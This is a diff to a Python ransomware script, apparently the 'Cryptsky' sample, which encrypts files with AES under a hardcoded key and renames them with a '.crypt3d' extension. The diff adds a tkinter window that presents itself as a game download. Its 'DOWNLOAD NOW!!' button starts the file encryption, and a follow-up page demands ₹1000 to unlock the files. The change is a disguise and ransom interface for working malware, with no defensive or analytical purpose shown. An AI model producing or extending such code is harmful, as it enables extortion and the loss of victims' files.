@@ -1,6 +1,8 @@
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 from random import random
+import tkinter as tk
+from tkinter import font as tkfont
 import sys
 import os
 
@@ -8,6 +10,74 @@ import os
 HARDCODED_KEY = 'yellow submarine'
 ENCRYPTED_EXTENSION = 'crypt3d'
 
+
+class SampleApp(tk.Tk):
+
+    def __init__(self, decrypt, *args, **kwargs):
+        self.decrypt = decrypt
+        tk.Tk.__init__(self, *args, **kwargs)
+
+        self.title_font = tkfont.Font(family='Helvetica', size=18, weight="bold", slant="italic")
+
+        # the container is where we'll stack a bunch of frames
+        # on top of each other, then the one we want visible
+        # will be raised above the others
+        container = tk.Frame(self)
+        container.pack(side="top", fill="both", expand=True)
+        container.grid_rowconfigure(0, weight=1)
+        container.grid_columnconfigure(0, weight=1)
+        self.geometry("800x200")
+
+        self.frames = {}
+        for F in (StartPage, PageOne):
+            page_name = F.__name__
+            frame = F(parent=container, controller=self)
+            self.frames[page_name] = frame
+
+            # put all of the pages in the same location;
+            # the one on the top of the stacking order
+            # will be the one that is visible.
+            frame.grid(row=0, column=0, sticky="nsew")
+        self.show_frame("PageOne" if decrypt else "StartPage")
+
+    def show_frame(self, page_name):
+        '''Show a frame for the given page name'''
+        main(self.decrypt)
+        frame = self.frames[page_name]
+        frame.tkraise()
+
+
+class StartPage(tk.Frame):
+
+    def __init__(self, parent, controller):
+        tk.Frame.__init__(self, parent)
+        self.controller = controller
+        label = tk.Label(self, text="Click on 'DOWNLOAD NOW' to download the game!", font=controller.title_font)
+        label.pack(side="top", fill="x", pady=10)
+
+        button1 = tk.Button(self, text="DOWNLOAD NOW!!",
+                            command=lambda: controller.show_frame("PageOne"))
+
+        button1.pack()
+
+
+
+class PageOne(tk.Frame):
+
+    def __init__(self, parent, controller):
+        tk.Frame.__init__(self, parent)
+        self.controller = controller
+
+        label = tk.Label(self, text="Your files have been encrypted. Pay ₹1000 to unlock.", font=controller.title_font)
+        label.pack(side="top", fill="x", pady=10)
+
+        label1 = tk.Label(self, text="Enter the key: ", font=("ariel", 12, "bold")).place(x=10,y=50)
+
+        key = tk.StringVar()
+        entry_box = tk.Entry(self, textvariable=key, width=25, bg="lightgreen").place(x=150, y=50)        
+
+        button = tk.Button(self, text="DECRYPT",command=lambda: controller.show_frame("StartPage")).place(x=200,y=100)
+    
 
 def discoverFiles(startpath, decrypt):
     if decrypt:
@@ -64,9 +134,7 @@ def modifyFile(filename, crypto, decrypt, blocksize=16):
         os.rename(filename, filename + '.' + ENCRYPTED_EXTENSION)
 
 
-def main():
-    decrypt = len(sys.argv) > 1 and sys.argv[1] == "-d"
-
+def main(decrypt):
     if decrypt:
         print('''
 Cryptsky!
@@ -115,4 +183,10 @@ Your decryption key is: '{}'
 
 
 if __name__ == "__main__":
-    main()
+    decrypt = len(sys.argv) > 1 and sys.argv[1] in ["-d", "--decrypt"]
+    # main(decrypt)
+
+    app = SampleApp(decrypt)
+
+    app.mainloop()
+
